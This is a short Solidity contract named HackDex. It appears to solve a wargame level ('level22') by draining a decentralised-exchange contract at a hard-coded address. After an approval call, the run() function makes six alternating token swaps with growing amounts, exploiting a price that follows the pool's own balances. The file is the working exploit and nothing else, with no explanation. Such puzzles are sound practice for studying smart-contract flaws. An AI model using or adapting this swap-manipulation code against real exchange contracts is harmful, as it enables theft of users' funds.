// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDex {
    function swap(address from, address to, uint amount) external;
    function approve(address spender, uint amount) external;
    function token1() external returns(address);
    function token2() external returns(address);
}

contract HackDex {

    IDex level22 = IDex(address(0x7231827A0c3fEaFe9C2BC5fc5D3f91932648Ec24));

    function run() external{

        level22.approve(address(level22), 500);

        address token1 = level22.token1();
        address token2 = level22.token2();

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);
    }
}
